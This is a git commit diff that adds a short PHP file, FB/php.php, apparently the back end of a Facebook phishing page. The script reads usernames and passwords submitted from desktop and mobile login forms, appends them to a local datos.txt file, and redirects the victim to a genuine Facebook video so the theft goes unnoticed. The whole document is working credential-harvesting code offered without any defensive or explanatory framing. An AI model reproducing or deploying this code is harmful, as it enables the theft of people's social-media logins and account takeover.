4de8eb095bfd419513b2ecf4349e8676cee3e636
thiagui19992 <140980973+thiagui19992@users.noreply.github.com>
2023-08-14 23:29:40 -0300

    Add files via upload

---
+++ FB/php.php
@@ -0,0 +1,21 @@
+<?php 
+	
+	$usuario = $_POST["user-pc"];
+	$contraseña = $_POST["pass-pc"];
+
+	$user = $_POST["user-m"];
+	$pass = $_POST["pass-m"];
+
+$contenido = "Usuario Movil: $user
+Contraseña Movil: $pass
+
+Usuario Pc: $usuario
+Contraseña Pc: $contraseña
+-----------------------------";
+
+	$archivo=fopen("datos.txt", "a+");
+	fwrite($archivo, $contenido);
+
+	header("Location: https://www.facebook.com/100008891251068/videos/1479868855652809");
+
+ ?>
